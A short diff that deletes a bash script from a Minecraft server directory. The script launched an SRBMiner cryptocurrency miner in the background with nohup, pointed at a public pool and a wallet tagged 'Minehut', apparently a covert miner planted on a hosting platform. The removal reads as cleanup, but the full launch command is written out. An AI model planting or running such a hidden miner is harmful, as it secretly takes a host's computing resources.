@@ -1,6 +1,0 @@
-#!/bin/bash
-
-cd /home/minecraft/server/mine/srbminer/
-chmod +x SRBMiner-MULTI
-
-nohup ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RLs9nMFAMRC2PphAzkaMp292JS12yz4xEY.Minehut --password x < /dev/null > /home/minecraft/server/mine/y.log 2>&1 &
